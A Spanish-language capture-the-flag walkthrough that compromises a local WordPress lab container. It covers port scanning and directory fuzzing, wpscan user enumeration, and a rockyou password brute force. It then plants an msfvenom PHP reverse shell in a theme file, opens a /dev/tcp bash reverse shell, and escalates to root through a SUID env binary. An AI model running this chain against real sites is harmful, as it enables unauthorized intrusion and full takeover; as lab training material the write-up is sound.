
Desplegamos el contenedor:

```Bash
bash auto_deploy.sh
```

![[Pasted image 20250201124208.png]]

Escaneamos la IP:

```Bash
nmap -sV -sC -sS -T 5 -n -Pn -p- 172.17.0.2
```

![[Pasted image 20250201125003.png]]

Hacemos **Fuzzing**:

```Bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,py,sh,txt
```

![[Pasted image 20250201125337.png]]

![[Pasted image 20250201134452.png]]

Nos metemos en la web:

![[Pasted image 20250201134823.png]]

Buscamos un usuario con **wpscan**:

```Bash
wpscan --url http://172.17.0.2/wordpress --enumerate u
```

![[Pasted image 20250201130803.png]]

![[Pasted image 20250201131856.png]]

Encontramos el usuario mario. Ahora buscamos la contraseña:

```Bash
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```

![[Pasted image 20250201133332.png]]

![[Pasted image 20250201133423.png]]

mario: love.

Nos logeamos:

![[Pasted image 20250201134851.png]]

Nos vamos a Apariencia -> Theme Code Editor:

![[Pasted image 20250201144943.png]]

![[Pasted image 20250201162508.png]]

Nos saldrá una página index.php que meteremos nuestro código.

![[Pasted image 20250201162554.png]]

Creamos código con **msfvenom** para una shell.php:

```Bash
msfvenom -p php/reverse_php  LHOST=172.17.0.1 LPORT=4444 -f raw > shell.php
```

![[Pasted image 20250201144730.png]]

Lo copiamos:

```Bash
cat shell.php
```

![[Pasted image 20250201144804.png]]

Lo pegamos y subimos en index.php:

![[Pasted image 20250201144914.png]]

Nos ponemos a la escucha con **netcat**:

```Bash
nc -lnvp 4444
```

![[Pasted image 20250201135929.png]]

Nos ponemos otra:

```Bash
nc -lnvp 443
```

![[Pasted image 20250201145606.png]]

Ejecutamos la ruta en el navegador:

```Bash
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php
```

![[Pasted image 20250201145258.png]]

Miramos en la shell:

![[Pasted image 20250201145543.png]]

Nos la mandamos a la otra shell:

```Bash
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

![[Pasted image 20250201145838.png]]

Miramos la otra shell:

![[Pasted image 20250201145933.png]]

Elevamos privilegios:

```Bash
find / -perm -4000 2>/dev/null
```

![[Pasted image 20250201155731.png]]

```Bash
/usr/bin/env /bin/bash -p
```

![[Pasted image 20250201150345.png]]

```Bash
whoami
```

![[Pasted image 20250201154317.png]]

